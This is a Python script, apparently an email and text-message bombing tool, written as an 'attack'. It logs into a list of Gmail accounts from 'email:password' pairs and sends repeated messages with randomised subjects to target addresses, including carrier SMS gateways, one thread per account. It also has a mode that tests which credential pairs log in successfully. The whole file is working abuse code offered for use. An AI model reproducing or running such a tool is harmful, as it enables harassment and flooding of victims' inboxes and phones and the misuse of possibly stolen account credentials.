# for gmail
import colorama
import sys
import time
import threading
import random
import smtplib
from email.mime.text import MIMEText
from colorama import Fore, Style, Back

'''

Must enable lessecure apps in gmail settings

'''

colorama.init(autoreset=True)

RED, GREEN, YELLOW, BOLD = Fore.RED, Fore.GREEN, Fore.YELLOW, Style.BRIGHT

smtp_ssl_host = 'smtp.gmail.com'  # smtp.mail.yahoo.com, smtp-mail.outlook.com, smtp.gmail.com


# made by goodppl

targets = ["TARGET_EMAIL_ADDRESS@email.com"]

phone_gateways = [
    "@tmomail",
    "@att",
    "@verizon"
]

is_sms_gateway = False

for phone_gateway in phone_gateways:
    for target in targets:
        if phone_gateway.strip().lower() in target.strip().lower():
            is_sms_gateway = True
            break

smtp_ssl_port = 465

only_check_logins = False
logins = [
    "email address:password",
]


counter_file = open("num_emails_sent.txt", "w", encoding="utf-8")

class counter:
    def __init__(self):
        self.num_emails_sent = 0
    def increment(self):
        self.num_emails_sent += 1

counterObject = counter()

def check_logins():
    working_logins = 0
    invalid_logins = 0
    for email in logins:
        try:
            server = smtplib.SMTP_SSL(smtp_ssl_host, smtp_ssl_port)
            sender = f"{email.split(':')[0].strip()}"
            username = f"{email.split(':')[0].strip()}"
            password = f"{email.split(':')[1].strip()}"
            server.login(username, password)
            working_logins += 1
            print(f"{BOLD}{RED} [+] {GREEN} Login for email -> {email} worked !")
        except Exception as err:
            invalid_logins += 1
            print(f"{BOLD}{GREEN} [!] {RED}{err} -> {YELLOW}{email}")
    print(f'''{BOLD}
            {RED} [+] {GREEN} Working Logins: {YELLOW}\'{working_logins:,}\'
            {GREEN} [!] {RED} Invalid Logins: {YELLOW}\'{invalid_logins:,}\'
    
    ''')


def send_email(email, is_sms_gateway):
    try:
        attack_type = "email" if is_sms_gateway != True else "text messages"
        num_emails_sent = 0
        server = smtplib.SMTP_SSL(smtp_ssl_host, smtp_ssl_port)
        
        sender = f"{email.split(':')[0].strip()}"

        
        username = f"{email.split(':')[0].strip()}"
        password = f"{email.split(':')[1].strip()}"
        server.login(username, password)
        for _ in range(5):
            try:
                msg = MIMEText(f"MESSAGE")
                msg['Subject'] = f"SUBJECT{random.randint(0, 99999)}"
                msg['From'] = sender
                msg['To'] = ', '.join(targets)

                server.sendmail(sender, targets, msg.as_string())
                num_emails_sent += 1
                counterObject.num_emails_sent += 1
                print(f"{BOLD}{GREEN} Sent {num_emails_sent:,} {attack_type} from {email} ! ")
                counter_file.write(f"[ Sent {num_emails_sent:,} {attack_type} from {email} ! ]\n")
                counter_file.flush()
            except Exception as err:
                print(f"{BOLD}{RED}{err} -> {email}")
                pass
        print(f"{BOLD}{GREEN} Sent {num_emails_sent:,} {attack_type} from {email} ! ")
        server.quit()
    except Exception as err:
        print(f"{BOLD}{RED}{err} -> {email}")

if only_check_logins:
    check_logins()
    sys.exit(0)
else:
    for email in logins:
        try:
            threading.Thread(target=send_email, args=(email, is_sms_gateway)).start()
        except Exception as err:
            print(f"{YELLOW}{err}")

    print(f"{BOLD}{RED} [+] {GREEN}Sent {YELLOW}\'{len(open('num_emails_sent.txt', 'r', encoding='utf-8').readlines()):,}\'{GREEN} emails ! ")
    while True:
        print(f"{BOLD}{RED} [+] {GREEN} Total emails+messages sent -> {counterObject.num_emails_sent:,}")
        time.sleep(1)
    